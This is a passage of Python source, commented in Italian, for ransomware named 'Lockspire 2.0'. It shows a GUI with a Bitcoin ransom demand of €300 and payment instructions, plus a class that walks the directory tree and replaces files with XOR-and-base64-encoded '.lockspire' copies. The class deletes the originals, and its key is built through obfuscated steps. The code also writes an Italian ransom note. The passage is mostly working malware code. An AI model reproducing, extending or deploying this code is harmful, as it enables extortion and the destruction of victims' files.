        Your files have been restored successfully.
        
        ⚠️ NOTE: Task Manager remains functional.
        You can now safely close the application.
        """
        
        self.status_var.set("✅ Recovery completed successfully - You may now close the application")
        self.progress_var.set("Recovery complete - 100%")
        
        titlebar_frame = self.root.winfo_children()[0]
        title_label = titlebar_frame.winfo_children()[0]
        title_label.config(text="🔐 LOCKSPIRE 2.0 - RECOVERY SYSTEM - RECOVERY COMPLETE")
        
        self.close_btn.pack(pady=(5, 10))
        self.close_title_btn.pack(side=tk.RIGHT, padx=15)
        
        self.root.protocol("WM_DELETE_WINDOW", self.safe_close)
        
        messagebox.showinfo("Recovery Complete", summary)
    
    def copy_payment_details(self):
        """Copia dettagli pagamento"""
        details = f"""LOCKSPIRE 2.0 - RECOVERY SYSTEM - PAYMENT DETAILS:

💰 AMOUNT: €300.00
₿ BITCOIN ADDRESS: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

INSTRUCTIONS:
1. Send €300 worth of Bitcoin to the address above
2. ⚠️ MUST INCLUDE in payment notes/memo:
   • Your PERSONAL EMAIL
   • System ID: {self.system_id}
3. Wait for payment confirmation
4. Decryption key will be generated

⚠️ CRITICAL: Include BOTH Email AND System ID in payment!
⚠️ Your System ID: {self.system_id}"""
        
        self.root.clipboard_clear()
        self.root.clipboard_append(details)
        
        messagebox.showinfo("Copied", "✅ Payment details copied to clipboard!\n\n⚠️ Don't forget to include BOTH:\n• Your PERSONAL EMAIL\n• System ID: {self.system_id}")
    
    def run(self):
        """Avvia applicazione"""
        self.root.mainloop()


class FileProtector:
    
    def __init__(self):
        self.processed_count = 0
        self._secret_key = self._generate_key()
        self.system_id = self._generate_system_id()
    
    def _generate_system_id(self):
        """Genera ID sistema"""
        return f"URS-{uuid.uuid4().hex[:8].upper()}"
    
    def _generate_key(self):
        """Genera chiave - STESSA CHIAVE ORIGINALE"""
        a = [0x52, 0x4f, 0x42, 0x4c, 0x4f, 0x58]
        b = ''.join(chr(x ^ 0x11) for x in [0x23, 0x23, 0x23])
        c = bytes.fromhex('52524555')[::-1].decode()
        d = str(0x7DC + 0x4)
        
        m = ''.join([chr(x) for x in a])
        n = ''.join([str(ord(x) - 48) for x in b])
        o = c.lower().upper()
        p = d
        
        r = f"{m}_{n}_{o}_{p}"
        
        s = base64.b64encode(r.encode()).decode()
        t = hashlib.sha256(s.encode()).hexdigest()
        u = hashlib.md5(t.encode()).hexdigest()
        
        v = ''
        for i in range(0, len(u), 2):
            v += u[i]
        
        w = base64.b64encode(v.encode()).decode()
        x = w.replace('=', 'X').replace('/', 'Z').replace('+', 'Y')
        
        final = x[:24]
        
        return final.upper()
    
    def _transform_content(self, data):
        """Trasforma contenuto - STESSO ALGORITMO ORIGINALE"""
        if not data:
            return b''
        
        b64_data = base64.b64encode(data)
        
        key_bytes = self._secret_key.encode()
        key_len = len(key_bytes)
        
        result = bytearray()
        for i, b in enumerate(b64_data):
            kb = key_bytes[i % key_len]
            result.append((b ^ kb) & 0xFF)
        
        header = b'ENC' + self._secret_key.encode() + b':'
        final = header + bytes(result)
        
        encoded = base64.b64encode(final)
        
        return encoded
    
    def _get_target_files(self):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        base_path = Path(script_dir)
        
        files = []
        
        try:
            for item in base_path.rglob('*'):
                if item.is_file():
                    name_low = item.name.lower()
                    
                    if name_low in ['crypter.py', 'decrypter.py']:
                        continue
                    
                    # Escludi file .lockspire (già crittografati)
                    if item.suffix == '.lockspire':
                        continue
                    
                    if item.suffix.lower() in ['.exe', '.dll', '.sys']:
                        continue
                    
                    if item.suffix.lower() in ['.py', '.pyc']:
                        continue
                    
                    try:
                        size = item.stat().st_size
                        if size > 0 and size < 500000000:
                            files.append(str(item))
                    except:
                        continue
                        
        except:
            pass
        
        return files
    
    def protect_file(self, filepath):
        """Protegge file con estensione .lockspire"""
        try:
            with open(filepath, 'rb') as f:
                original = f.read()
            
            protected = self._transform_content(original)
            
            # Usa estensione .lockspire invece di .encrypted
            new_path = filepath + '.lockspire'
            with open(new_path, 'wb') as f:
                f.write(protected)
            
            os.remove(filepath)
            
            self.processed_count += 1
            return True
            
        except Exception as e:
            return False
    
    def _create_instructions(self):
        system_id = self.system_id
        
        msg = f"""
I TUOI FILE SONO STATI CRITTOGRAFATI

PER DECRITTOGRAFARE:
1. Invia €300 Bitcoin all'indirizzo fornito
2. INCLUIDI nel pagamento:
   • La tua EMAIL PERSONALE
   • System ID: {system_id}
3. Ricevi la chiave di decrittazione

File crittografati: {self.processed_count}
ID Sistema: {system_id}

⚠️ IMPORTANTE: Includi sia Email che System ID nel pagamento!

Avvia il programma per recuperare i file.
"""
        
        try:
            with open("LEGGIMI.txt", 'w') as f:
                f.write(msg)
            return True
        except:
            return False


if __name__ == "__main__":
    if sys.platform == 'win32':
        try:
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            kernel32.SetConsoleTitleW("Lockspire 2.0 Recovery Tool")
        except:
            pass
    
    app = LockspireRecoverySuite()
    app.run()
